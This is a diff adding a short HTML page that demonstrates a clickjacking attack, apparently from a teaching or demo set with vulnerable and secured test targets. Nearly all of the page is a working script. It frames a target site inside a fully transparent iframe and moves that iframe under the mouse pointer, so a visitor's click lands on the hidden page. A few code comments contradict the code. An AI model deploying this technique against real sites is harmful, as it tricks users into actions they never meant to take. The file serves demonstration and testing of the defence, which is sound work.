@@ -1,0 +1,59 @@
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
+<html> <head>
+<title>Clickjacking</title>
+</head>
+
+<body>
+<h1>Clickjacking</h1>
+
+<button type="button">Click me!</button>
+
+<script type="text/javascript">
+
+    // Create an iframe that's supposed to hide what we want the victim to click on
+    a = document.body.appendChild(document.createElement("iframe"));
+    a.d = a.contentDocument;
+    a.d.open().close();
+    a.style.width = 60;
+    a.style.height = 35;
+
+    // Create an iframe that frames what we want the victim to click on
+    i = a.d.createElement("iframe");
+    a.style.border = i.style.border = 0;
+    a.style.marginwidth = i.style.marginwidth = 0;
+    a.style.marginheight = i.style.marginheight = 0;
+    a.style.frameborder = i.style.frameborder = 1;
+    a.style.position = i.style.position = "absolute";
+    a.style.overflow = i.style.overflow = "hidden";
+
+    // Make the hiding iframe almost opaque to make the example visible
+    a.style.opacity = .0;
+
+    // The example is targeted towards vulnerable.1-liner.org:8444
+    i.src = "https://vulnerable.1-liner.org:8444";  // Vulnerable
+    //i.src = "https://secure.1-liner.org:8443/struts2/secured";  // X-Frame-Options
+    i.style.width = 915;
+    i.style.height = 330;
+    i.style.left = -180;
+    i.style.top = -60; // -290
+    i.style.marginwidth = 0;
+    i.style.marginheight = 0;
+    i.style.frameborder = 1;
+
+    // Add the john.com iframe to the hiding iframe
+    a.d.body.appendChild(i);
+
+    // Create a function which lets the hiding iframe track the mouse pointer
+    function followmouse(e) {
+        xcoord = ycoord = 40;
+        xcoord += e.pageX - 50;
+        ycoord += e.pageY - 50;
+        a.style.left = xcoord;
+        a.style.top = ycoord;
+    }
+
+    // Track the mouse pointer with the hiding iframe
+    document.onmousemove = followmouse;
+</script>
+
+</body> </html>
